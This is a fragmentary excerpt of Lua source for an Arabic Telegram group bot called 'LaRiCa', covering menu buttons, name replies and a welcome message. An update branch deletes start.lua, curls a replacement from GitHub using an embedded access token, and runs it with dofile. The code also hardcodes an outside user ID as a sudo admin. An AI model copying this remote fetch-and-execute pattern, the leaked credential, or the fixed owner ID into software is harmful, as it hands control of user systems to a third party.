...
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
namebot = redis:get(bot_id..":namebot") or " ماكس"
SudosS = {5115522056}
Sudos = {sudoid,5115522056}
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
function Bot(msg)  
local idbot = false  
...
type = 'inline',
data = {
{{text = '‹ : FSouRce LaRiCa .',url="t.me/FeLX_TEaM"}},
}
}
...
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "ماكس"),data="delnamebot"}},
...
os.execute('rm -rf start.lua')
os.execute('curl -s https://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@raw.githubusercontent.com/LARICA919/u/main/start.lua -o start.lua')
dofile('start.lua')  
end
end 
if text == "تحديث" then
...
namet = {"اسمي "..(redis:get(bot_id..":namebot") or "ماكس"),"عمريي اسمي "..(redis:get(bot_id..":namebot") or "ماكس"),"اني لقميل "..(redis:get(bot_id..":namebot") or "ماكس"),(redis:get(bot_id..":namebot") or "ماكس").." اني"}
bot.sendText(msg.chat_id,msg.id,"*"..namet[math.random(#namet)].."*","md",true)  
end
if text == "بوت" or text == (redis:get(bot_id..":namebot") or "ماكس") then
...
{{text = '‹ : 𝖲??𝗎𝖱??𝖾 𝖾𝗂𝗅𝖺𝗇𝖣 .',url="t.me/FeLX_TEaM"}},
}
}
...
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : FSouRce LaRiCa .',url="https://t.me/FeLX_TEaM"}},
}
}
...
local Text = "*‹ : WeLCoMe To FSouRce LaRiCa  .*\n"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '‹ : SouRce LaRiCa .',url="https://t.me/FeLX_TEaM"}},
{{text = '‹ : inFo LaRiCa .',url="https://t.me/BBBBRR"}},
{{text = '‹ : CoDeR .',url="https://t.me/sSs_sSs"}},
}
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg.chat_id .. "&photo=https://t.me/FeLX_TEaM&caption=".. URL.escape(Text).."&photo=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
----------------------------------------------------------------------------------------------------
if text == 'تفعيل' then
if msg.can_be_deleted_for_all_users == false then
